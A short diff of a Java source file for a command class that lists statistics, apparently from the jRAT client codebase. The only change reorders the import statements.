@@ -3,9 +3,9 @@ package su.jrat.client.commands;
 import java.io.PrintStream;
 import java.util.List;
 
+import jrat.api.commands.AbstractCommand;
 import su.jrat.client.settings.Statistics;
 import su.jrat.client.settings.Statistics.StatEntry;
-import jrat.api.commands.AbstractCommand;
 
 public class CommandListStatistics extends AbstractCommand {
 
